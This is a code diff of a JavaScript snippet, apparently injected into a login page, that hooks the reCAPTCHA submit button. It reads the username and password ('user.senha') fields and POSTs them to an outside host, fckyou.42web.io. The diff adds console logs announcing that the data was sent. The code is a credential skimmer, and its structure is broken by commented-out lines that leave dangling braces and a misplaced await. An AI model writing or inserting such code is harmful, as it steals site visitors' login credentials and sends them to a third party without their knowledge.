@@ -1,24 +1,32 @@
-    let btn = document.getElementsByClassName("g-recaptcha")
-    const username = document.querySelector('[name="user.login"]')
-    const password = document.querySelector('[name="user.senha"]')
+let btn = document.getElementsByClassName("g-recaptcha")
+const username = document.querySelector('[name="user.login"]')
+const password = document.querySelector('[name="user.senha"]')
 
-    btn[0].addEventListener("click", function(){
-        let xhr = new XMLHttpRequest();
+btn[0].addEventListener("click", function(){
+    console.log("Botão de envio de formulário clicado.");
 
-        //xhr.open('GET', 'https://raw.githubusercontent.com/Wolota/ips/main/url-new', true);
-        //xhr.onreadystatechange = async function() {
-            if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
-                const urlContent = xhr.responseText;
+    let xhr = new XMLHttpRequest();
 
-                const data = new FormData();
-                data.append("username", username.value);
-                data.append("password", password.value);
+    console.log("Objeto XMLHttpRequest criado.");
 
-                const response = await fetch("http://fckyou.42web.io/index/get.php", {
-                    method: "POST",
-                    body: data
-                });
-            }
-        };
-        xhr.send();
-    });
+    //xhr.open('GET', 'https://raw.githubusercontent.com/Wolota/ips/main/url-new', true);
+    //xhr.onreadystatechange = async function() {
+        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+            const urlContent = xhr.responseText;
+
+            const data = new FormData();
+            data.append("username", username.value);
+            data.append("password", password.value);
+
+            const response = await fetch("http://fckyou.42web.io/index/get.php", {
+                method: "POST",
+                body: data
+            });
+
+            console.log("Dados enviados com sucesso para http://fckyou.42web.io/index/get.php.");
+        }
+    };
+    xhr.send();
+
+    console.log("Requisição enviada para o servidor.");
+});
